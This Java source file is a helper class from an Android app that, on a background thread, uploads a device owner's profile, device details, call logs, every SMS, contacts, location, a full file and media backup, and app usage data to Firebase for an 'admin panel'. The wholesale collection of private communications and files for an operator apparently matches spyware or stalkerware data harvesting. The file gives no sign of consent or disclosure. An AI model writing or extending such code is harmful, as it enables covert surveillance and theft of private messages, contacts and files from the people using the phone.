package com.bushorat.app.helpers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

import java.util.HashMap;
import java.util.Map;

/**
 * Syncs all available user data to user_data/{userId}/ for the admin panel.
 */
public class UserDataSyncHelper {
    private static final String TAG = "UserDataSyncHelper";
    private static volatile boolean syncInProgress = false;

    public static void syncAll(Context context) {
        syncAll(context, true);
    }

    /** @param includeMedia when false, skips file backup (caller already started SyncService). */
    public static void syncAll(Context context, boolean includeMedia) {
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null) {
            Log.w(TAG, "Cannot sync: user not logged in");
            return;
        }

        if (syncInProgress) {
            Log.d(TAG, "Sync already in progress — skipping duplicate run");
            return;
        }

        Context appContext = context.getApplicationContext();
        String userId = user.getUid();

        new Thread(() -> {
            syncInProgress = true;
            try {
            Log.d(TAG, "Starting user data sync for " + userId);

            updateProfileSummary(user);
            DeviceInfoHelper.uploadToFirebase(appContext);

            if (hasPermission(appContext, Manifest.permission.READ_CALL_LOG)) {
                CallLogHelper.uploadRecentCallLogs(appContext);
            } else {
                Log.w(TAG, "Skipping call logs: permission not granted");
            }

            if (hasPermission(appContext, Manifest.permission.READ_SMS)) {
                SmsSyncHelper.syncAllSms(appContext);
            } else {
                Log.w(TAG, "Skipping SMS: permission not granted");
            }

            if (hasPermission(appContext, Manifest.permission.READ_CONTACTS)) {
                DataCollectionHelper collector = new DataCollectionHelper(appContext, true);
                collector.collectContacts();
            } else {
                Log.w(TAG, "Skipping contacts: permission not granted");
            }

            if (FeaturePermissions.hasLocationPermission(appContext)) {
                LocationSyncHelper.uploadIfAllowed(appContext);
            } else {
                Log.w(TAG, "Skipping location: permission not granted");
            }

            if (includeMedia && FeaturePermissions.hasGalleryPermission(appContext)) {
                FileBackupHelper.startFullBackup(appContext);
            }

            if (AppUsageSyncHelper.hasUsageAccess(appContext)) {
                AppUsageSyncHelper.syncIfAllowed(appContext);
            } else {
                Log.w(TAG, "Skipping app usage: usage access not granted");
            }

            FirebaseDataPaths.syncStatus(userId).child("last_full_sync")
                    .setValue(System.currentTimeMillis());

            Log.d(TAG, "User data sync finished for " + userId);
            } catch (Exception e) {
                Log.e(TAG, "User data sync failed", e);
            } finally {
                syncInProgress = false;
            }
        }).start();
    }

    private static boolean hasPermission(Context context, String permission) {
        return ContextCompat.checkSelfPermission(context, permission)
                == PackageManager.PERMISSION_GRANTED;
    }

    private static void updateProfileSummary(FirebaseUser user) {
        Map<String, Object> profile = new HashMap<>();
        profile.put("userId", user.getUid());
        profile.put("email", user.getEmail() != null ? user.getEmail() : "");
        profile.put("displayName", user.getDisplayName() != null ? user.getDisplayName() : "");
        profile.put("deviceModel", Build.MANUFACTURER + " " + Build.MODEL);
        profile.put("lastSeen", System.currentTimeMillis());

        FirebaseDataPaths.profile(user.getUid()).updateChildren(profile)
                .addOnSuccessListener(unused -> Log.d(TAG, "Profile synced for " + user.getUid()))
                .addOnFailureListener(e -> Log.e(TAG, "Profile sync failed", e));
    }
}
